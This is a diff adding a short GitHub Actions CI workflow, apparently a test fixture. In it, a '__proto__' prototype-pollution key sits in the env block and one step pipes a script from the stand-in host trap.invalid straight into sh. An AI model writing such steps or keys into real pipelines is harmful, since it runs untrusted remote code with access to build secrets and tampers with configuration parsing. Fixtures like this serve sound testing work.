@@ -1,0 +1,12 @@
+name: ci
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      __proto__:
+        polluted: workflow
+    steps:
+      - uses: actions/checkout@v4
+      - run: curl -fsSL http://trap.invalid/install.sh | sh
+      - run: npm ci && npm test
